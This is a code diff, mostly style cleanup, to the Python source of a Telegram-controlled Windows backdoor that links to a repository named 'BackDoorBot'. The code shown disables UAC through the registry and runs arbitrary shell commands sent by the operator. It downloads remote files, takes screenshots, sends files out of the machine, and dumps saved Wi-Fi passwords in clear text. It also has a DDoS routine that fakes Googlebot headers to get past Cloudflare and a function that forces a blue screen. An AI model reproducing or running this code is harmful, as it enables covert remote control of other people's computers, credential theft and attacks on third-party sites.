@@ -11,17 +11,16 @@ import keyboard
 import telebot
 from cryptography.fernet import Fernet
 
-
-name_file = "config" 
+name_file = "config"
 
 with open(name_file, 'rb') as file:
     data1 = file.read()
 
-if len(data1.split()) > 1: # если не зашифрованный
+if len(data1.split()) > 1:  # если не зашифрованный
 
-    key = Fernet.generate_key() # генер ключа шифрования
+    key = Fernet.generate_key()  # генер ключа шифрования
     f = Fernet(key)
-    encrypted_text = key[:22] + f.encrypt(data1) + key[-22:] 
+    encrypted_text = key[:22] + f.encrypt(data1) + key[-22:]
 
     with open(name_file, 'wb') as file:
         file.write(encrypted_text)
@@ -30,21 +29,21 @@ else:
 
     with open(name_file, 'rb') as file:
         data2 = file.read()
-    key = data2[:22] + data2[-22:] # чтение ключа
+    key = data2[:22] + data2[-22:]  # чтение ключа
     f = Fernet(key)
 
 with open(name_file, 'rb') as file:
-        data3 = file.read()[22:-22]
+    data3 = file.read()[22:-22]
 
 decrypted_text = f.decrypt(data3).decode().split()
 
-class Data: 
+
+class Data:
     name = decrypted_text[0]
     token = decrypted_text[1]
-    id = [int(i) for i in decrypted_text[2][1:-1].split(',')] 
+    id = [int(i) for i in decrypted_text[2][1:-1].split(',')]
     update = int(decrypted_text[3])
     uic = int(decrypted_text[4])
-
 
 
 class Logger_Bot:
@@ -55,21 +54,20 @@ class Logger_Bot:
         if len(files) >= day:
             files = sorted(files)[:-3]
             for i in files:
-                os.remove(self.path+i)
+                os.remove(self.path + i)
 
     def __save_log(self, text):
-        path_log = self.path + 'log_' + datetime.now().strftime('%Y-%m-%d').replace(' ','_').replace(':','-')+".txt"
+        path_log = self.path + 'log_' + datetime.now().strftime('%Y-%m-%d').replace(' ', '_').replace(':', '-') + ".txt"
         arg = 'w'
         if os.path.exists(path_log):
             arg = 'a'
         with open(path_log, arg) as new_log:
-            new_log.write(text+"\n")
+            new_log.write(text + "\n")
 
     def log(self, name_func, e_text):
-        time_e = datetime.now().strftime('%H:%M:%S').replace(' ','_').replace(':','-')
+        time_e = datetime.now().strftime('%H:%M:%S').replace(' ', '_').replace(':', '-')
         text = f"[{time_e}] {name_func}: {e_text}."
         self.__save_log(text)
-
 
 
 if not os.path.isdir('media'):
@@ -87,6 +85,7 @@ TOKEN_PC = [Data.name, Data.token]
 bot = telebot.TeleBot(TOKEN_PC[1])
 logger = Logger_Bot()
 
+
 class Func_API:
     def __init__(self) -> None:
         self.NAME_PC = TOKEN_PC[0]
@@ -96,22 +95,24 @@ class Func_API:
                 if ctypes.windll.shell32.IsUserAnAdmin():
                     bot.send_message(ids, f'{self.NAME_PC} запущен от имени администратора')
 
-                    if not Data.uic: # Отрубает UAC
+                    if not Data.uic:  # Отрубает UAC
                         try:
                             command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
-                            subprocess.run(['cmd.exe', '/c', command1], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                            subprocess.run(['cmd.exe', '/c', command1], shell=True, check=True, stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE)
                             command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
-                            subprocess.run(['cmd.exe', '/c', command2], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                            subprocess.run(['cmd.exe', '/c', command2], shell=True, check=True, stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE)
                             decrypted_text[4] = "1"
                             decrypted_text = " ".join(decrypted_text).encode('utf-8')
                             encrypted_text = key[:22] + f.encrypt(decrypted_text) + key[-22:]
-  
+
                             with open('config', 'wb') as file:
-                                file.write(encrypted_text) # изменение записи конфига об UIC
+                                file.write(encrypted_text)  # изменение записи конфига об UIC
 
                         except Exception as e:
-                                logger.log("disable_UAC",e)
-                                bot.send_message(ids, f'🖥❌ \n{e}')
+                            logger.log("disable_UAC", e)
+                            bot.send_message(ids, f'Ошибка: {e}')
 
                 else:
                     bot.send_message(
@@ -121,7 +122,7 @@ class Func_API:
                 logger.log('__init__', 'Вы указали неверный токен')
                 bot.stop_polling()
 
-    def rasbiv(self, text): # нормализация и разбив на нужные значения
+    def rasbiv(self, text):  # нормализация и разбив на нужные значения
         texn = text.split()
         texc = text.split("{")[1:]
         for i in range(len(texc)):
@@ -136,22 +137,22 @@ class Func_API:
         for i in dir:
             if i[:3] == fig:
                 lop += 1
-        return fig+str(lop)
+        return fig + str(lop)
 
     def ren(self, path, content):
         vb = self.find_name(content)
         if content == "vid":
-            os.rename("media/"+path, "media/"+vb+".mp4")
+            os.rename("media/" + path, "media/" + vb + ".mp4")
         elif content == "pic":
-            os.rename("media/"+path, "media/"+vb+".png")
+            os.rename("media/" + path, "media/" + vb + ".png")
         return vb
 
-    def cmdo_ret(self, com): # нужно для работы ф-ции specifications
+    def cmdo_ret(self, com):  # нужно для работы ф-ции specifications
         try:
-            res = subprocess.check_output(com, shell=1)
+            res = subprocess.check_output(com, shell=True)
         except Exception as e:
-            logger.log(self.cmdo_ret.__name__,e)
-            return '🖥❌'
+            logger.log(self.cmdo_ret.__name__, e)
+            return f'Ошибка: {e}'
 
         try:
             res = res.decode('utf8')
@@ -159,38 +160,38 @@ class Func_API:
             try:
                 res = res.decode('cp866')
             except Exception as e:
-                return '🖥❌'
-        return '🖥✅:\n'+res
+                return f'Ошибка: {e}'
+        return 'Успешно:\n' + res
 
-    def cmdo(self, com): # output от выполнения команды в cmd
+    def cmdo(self, com):  # output от выполнения команды в cmd
         try:
-            res = subprocess.check_output(com, shell=1)
+            res = subprocess.check_output(com, shell=True)
         except Exception as e:
-            logger.log(self.cmdo.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.cmdo.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
         try:
             res = res.decode('utf8')
         except:
             try:
                 res = res.decode('cp866')
             except Exception as e:
-                logger.log(self.cmdo.__name__,e)
-                bot.send_message(self.id, f'🖥❌ \n{e}')
-        bot.send_message(self.id, '🖥✅:\n'+res)
+                logger.log(self.cmdo.__name__, e)
+                bot.send_message(self.id, f'Ошибка: {e}')
+        bot.send_message(self.id, 'Успешно:\n' + res)
 
-    def cmdi(self, com): # выполнение команды в cmd
+    def cmdi(self, com):  # выполнение команды в cmd
         try:
             os.system(com)
-            bot.send_message(self.id, "🖥✅")
+            bot.send_message(self.id, "Успешно")
         except Exception as e:
-            logger.log(self.cmdi.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.cmdi.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def exits(self): # очищает папку с медиа
+    def exits(self):  # очищает папку с медиа
         dir = os.listdir("media/")
         for i in dir:
-            os.remove("media/"+i)
-        bot.send_message(self.id, "🖥✅")
+            os.remove("media/" + i)
+        bot.send_message(self.id, "Успешно")
 
     def ip_address(self):
         try:
@@ -224,54 +225,56 @@ class Func_API:
             logger.log(self.ip_address.__name__, 'Ошибка соединения')
             bot.send_message(self.id, 'Ошибка соединения')
 
-    def wgt(self, text_comand): # скачивание файла по ссылке
+    def wgt(self, text_comand):  # скачивание файла по ссылке
         try:
             wget.download(text_comand[0], text_comand[1])
-            bot.send_message(self.id, "🖥✅")
+            bot.send_message(self.id, "Успешно")
         except Exception as e:
-            logger.log(self.wgt.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.wgt.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def rebooting(self, timer): # перезагрузка пк
+    def rebooting(self, timer):  # перезагрузка пк
         try:
-            timer = "shutdown /r /t "+str(timer)
+            timer = "shutdown /r /t " + str(timer)
             os.system(timer)
-            bot.send_message(self.id, "🖥✅")
+            bot.send_message(self.id, "Успешно")
         except Exception as e:
-            logger.log(self.rebooting.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.rebooting.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def shotdowning(self, timer): # выключение пк
+    def shotdowning(self, timer):  # выключение пк
         try:
-            timer = "shutdown /s /t "+str(timer)
+            timer = "shutdown /s /t " + str(timer)
             os.system(timer)
-            bot.send_message(self.id, "🖥✅")
+            bot.send_message(self.id, "Успешно")
         except Exception as e:
-            logger.log(self.shotdowning.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.shotdowning.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def picture(self, file): # открытие картинки из папки с медиа
+    def picture(self, file):  # открытие картинки из папки с медиа
         try:
             command = f"media\\{file}.png"
             os.startfile(command)
-            bot.send_message(self.id, "🖥✅")
+            bot.send_message(self.id, "Успешно")
         except Exception as e:
-            logger.log(self.picture.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.picture.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def video(self, file): # открытие видео из папки с медиа
+    def video(self, file):  # открытие видео из папки с медиа
         try:
             command = f"media\\{file}.mp4"
             os.startfile(command)
-            bot.send_message(self.id, "🖥✅")
+            bot.send_message(self.id, "Успешно")
         except Exception as e:
-            logger.log(self.video.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.video.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def specifications(self): # возвращает характеристики пк
+    def specifications(self):  # возвращает характеристики пк
         x, y = pyautogui.size()
         proc = self.cmdo_ret('powershell "Get-WmiObject -Class Win32_Processor | select Name"').split('\n')[4][:-2]
-        ram = int(self.cmdo_ret('powershell "Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum"').split("\n")[5].split(': ')[1][:-1])//1073741824
+        ram = int(self.cmdo_ret(
+            'powershell "Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum"').split("\n")[
+                      5].split(': ')[1][:-1]) // 1073741824
         vid = self.cmdo_ret('powershell "Get-WmiObject Win32_VideoController | select Name"').split('\n')[4][:-1]
         banner = f"""Name PC:   {platform.node()}
 System:       {platform.system()} {platform.release()}
@@ -281,76 +284,76 @@ RAM:            {ram} GB
 Screen:        {x}x{y}"""
         bot.send_message(self.id, banner)
 
-    def rask(self): # меняет раскладку
+    def rask(self):  # меняет раскладку
         try:
             keyboard.press_and_release("alt+shift")
-            bot.send_message(self.id, "🖥✅")
+            bot.send_message(self.id, "Успешно")
         except Exception as e:
-            logger.log(self.specifications.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.specifications.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def screenshot(self): # скриншот и его отправка
-        filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ','_').replace(':','-')}.jpg"
+    def screenshot(self):  # скриншот и его отправка
+        filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ', '_').replace(':', '-')}.jpg"
         pyautogui.screenshot(filename)
         img = open(filename, "rb")
         bot.send_document(self.id, img)
         img.close()
         os.remove(filename)
 
-    def keyb(self, text): # печать текста
+    def keyb(self, text):  # печать текста
         try:
             text = text.split("+")
             listing = ""
             button = ["shift", "alt", "f1", "f2", "f3", "f4", "f5", "f6", "f7",
-                      "f8", "f9", "f10", "f11", "f12", "tab", "ctrl", "enter", "capslock"] # спец. клавиши
+                      "f8", "f9", "f10", "f11", "f12", "tab", "ctrl", "enter", "capslock"]  # спец. клавиши
             for i in text:
                 try:
                     index = button.index(i)
-                    listing += i+"+"
+                    listing += i + "+"
                 except Exception as e:
                     for kip in i:
-                        listing += kip+"+"
+                        listing += kip + "+"
             listing = listing[:-1].replace(' ', 'space')
             keyboard.press_and_release(listing)
-            bot.send_message(self.id, "🖥✅")
+            bot.send_message(self.id, "Успешно")
         except Exception as e:
-            logger.log(self.keyb.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.keyb.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def print_gui(self, text): # создаёт окно с текстом
+    def print_gui(self, text):  # создаёт окно с текстом
         try:
             pyautogui.alert(text, "~")
-            bot.send_message(self.id, '🖥✅')
+            bot.send_message(self.id, 'Успешно')
         except Exception as e:
-            logger.log(self.print_gui.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.print_gui.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def input_gui(self, text): # создаёт окно с текстом и полем для ввода
+    def input_gui(self, text):  # создаёт окно с текстом и полем для ввода
         try:
             answer = pyautogui.prompt(text, "~")
             bot.send_message(self.id, answer)
         except Exception as e:
-            logger.log(self.input_gui.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.input_gui.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def closes(self): # закрывает открытое сейчас приложение
+    def closes(self):  # закрывает открытое сейчас приложение
         try:
             keyboard.press_and_release("alt+f4")
-            bot.send_message(self.id, '🖥✅')
+            bot.send_message(self.id, 'Успешно')
         except Exception as e:
-            logger.log(self.closes.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.closes.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def start_file(self, path): # запускает файл по его path'у
+    def start_file(self, path):  # запускает файл по его path'у
         try:
-            text = "start media/"+path
+            text = "start media/" + path
             os.system(text)
-            bot.send_message(self.id, '🖥✅')
+            bot.send_message(self.id, 'Успешно')
         except Exception as e:
-            logger.log(self.start_file.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.start_file.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def direct(self, paths): # аналог команды tree с глубеной шага 1
+    def direct(self, paths):  # аналог команды tree с глубеной шага 1
         try:
             if paths == ".":
                 paths = os.getcwd()
@@ -358,20 +361,20 @@ Screen:        {x}x{y}"""
             exit_str += f"{paths}: \n\n"
             current, dirs, files = os.walk(paths).__next__()
             for i in files:
-                exit_str += i+"\n"
+                exit_str += i + "\n"
             for i in dirs:
                 try:
-                    o = os.listdir(paths+"/"+i)
-                    exit_str += "|"+i+"\n"
+                    o = os.listdir(paths + "/" + i)
+                    exit_str += "|" + i + "\n"
                     for l in o:
-                        exit_str += "| - "+l+"\n"
+                        exit_str += "| - " + l + "\n"
                     exit_str += "\n"
                 except:
                     pass
             bot.send_message(self.id, exit_str)
         except Exception as e:
-            logger.log(self.direct.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.direct.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
     def update_bot(self):
         pth = os.getcwd()
@@ -384,12 +387,12 @@ exit'''
 
         text_vbs = f'''
 set sh=CreateObject("Wscript.Shell")
-sh.Run "{pth}\\upd.bat", 0''' # текст для скрипта обновы
+sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
 
         open('upd.bat', 'w').write(text_bat)
         open('upd.vbs', 'w').write(text_vbs)
         os.startfile('upd.vbs')
-        bot.stop_polling() # остановка бота
+        bot.stop_polling()  # остановка бота
 
     def ddos(self, url):
         # Устанавливаем headers Google бота, для обхода Cloudflare
@@ -409,7 +412,7 @@ sh.Run "{pth}\\upd.bat", 0''' # текст для скрипта обновы
             except:
                 pass
 
-    def pull_file(self, path: str): # отправка файла с пк в тг
+    def pull_file(self, path: str):  # отправка файла с пк в тг
         path = path.replace('\\', '/')
         if os.path.exists(path):
             file = open(path, 'rb')
@@ -417,42 +420,43 @@ sh.Run "{pth}\\upd.bat", 0''' # текст для скрипта обновы
         else:
             path = path.split('/')
             if len(path) <= 1:
-                otv = f"🖥❌ File not found \n|{os.getcwd()}\n|--  " + \
-                    '\n|--  '.join(os.listdir(os.getcwd()))
+                otv = f"Ошибка: файл не найден \n|{os.getcwd()}\n|--  " + \
+                      '\n|--  '.join(os.listdir(os.getcwd()))
             else:
                 pr = '/'.join(path[:-1])
-                otv = f"🖥❌ File not found \n|{pr}\n|--  " + \
-                    '\n|--  '.join(os.listdir(pr))
+                otv = f"Ошибка: файл не найден \n|{pr}\n|--  " + \
+                      '\n|--  '.join(os.listdir(pr))
             bot.send_message(self.id, otv)
 
-    def browser(self, link): # открытие ссылки в браузере
+    def browser(self, link):  # открытие ссылки в браузере
         try:
             linke = 'start ' + link
             os.system(linke)
-            bot.send_message(self.id, '🖥✅')
+            bot.send_message(self.id, 'Успешно')
         except Exception as e:
-            logger.log(self.browser.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
+            logger.log(self.browser.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
-    def extract_wifi_passwords(self): # камуниздинг паролей от wifi
+    def extract_wifi_passwords(self):  # камуниздинг паролей от wifi
         try:
             otv = ''
             profiles_data = subprocess.check_output('netsh wlan show profiles').decode('utf-8').split('\n')
             profiles = [i.split(':')[1].strip() for i in profiles_data if 'All User Profile' in i]
-            
+
             for profile in profiles:
-                profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode('utf-8').split('\n')
+                profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode(
+                    'utf-8').split('\n')
 
                 try:
                     password = [i.split(':')[1].strip() for i in profile_info if 'Key Content' in i][0]
                 except IndexError:
                     password = None
                 otv += f'Profile: {profile}\nPassword: {password}\n{"#" * 20}\n'
-            bot.send_message(self.id, f'🖥✅\n{otv}')
+            bot.send_message(self.id, f'Успешно\n{otv}')
         except Exception as e:
-            logger.log(self.extract_wifi_passwords.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
-    
+            logger.log(self.extract_wifi_passwords.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
+
     def bsod(self):
         nullptr = ctypes.POINTER(ctypes.c_int)()
 
@@ -472,15 +476,15 @@ sh.Run "{pth}\\upd.bat", 0''' # текст для скрипта обновы
             ctypes.byref(ctypes.c_uint())
         )
 
-    def perfor(self, text, id_chat): # главный обработчик
+    def perfor(self, text, id_chat):  # главный обработчик
         try:
             self.id = id_chat
             text = self.rasbiv(text)
             name_pc = text["name"]
             comnd = text["cmnd"]
-            text_comand = text["text"] # преобразования
+            text_comand = text["text"]  # преобразования
 
-            if name_pc.lower() == self.NAME_PC or name_pc.lower() == "all": # выполнения команд
+            if name_pc.lower() == self.NAME_PC or name_pc.lower() == "all":  # выполнения команд
                 if comnd == "wget":
                     self.wgt(text_comand)
 
@@ -546,7 +550,7 @@ sh.Run "{pth}\\upd.bat", 0''' # текст для скрипта обновы
 
                 if comnd == "wifi" or comnd == "extract_wifi_passwords":
                     self.extract_wifi_passwords()
-                
+
                 if comnd == "bsod":
                     self.bsod()
 
@@ -558,10 +562,8 @@ sh.Run "{pth}\\upd.bat", 0''' # текст для скрипта обновы
                     self.update_bot()
         except:
             e = "Ошибка в ведённой команде"
-            logger.log(self.rasbiv.__name__,e)
-            bot.send_message(self.id, f'🖥❌ \n{e}')
-
-        
+            logger.log(self.rasbiv.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
 
 
 func_api = Func_API()
@@ -570,7 +572,8 @@ func_api = Func_API()
 @bot.message_handler(commands=['info', 'start'])
 def start_message(message):
     if message.chat.id in id:
-        bot.send_message(message.chat.id, "Список функций: \nhttps://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/documentation.txt")
+        bot.send_message(message.chat.id,
+                         "Список функций: \nhttps://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/documentation.txt")
 
 
 @bot.message_handler(content_types=['text'])
@@ -613,10 +616,10 @@ def handle_file(message):
             src = 'media/' + message.document.file_name
             with open(src, 'wb') as new_file:
                 new_file.write(downloaded_file)
-            bot.reply_to(message, "🖥✅")
+            bot.reply_to(message, "Успешно")
         except Exception as e:
-            logger.log('message_handler_doc',e)
-            bot.reply_to(message, f"🖥❌\n{e}")
+            logger.log('message_handler_doc', e)
+            bot.reply_to(message, f"Ошибка: {e}")
 
 
-bot.infinity_polling() # запуск сканирования новых сообщений от тг
+bot.infinity_polling()  # запуск сканирования новых сообщений от тг
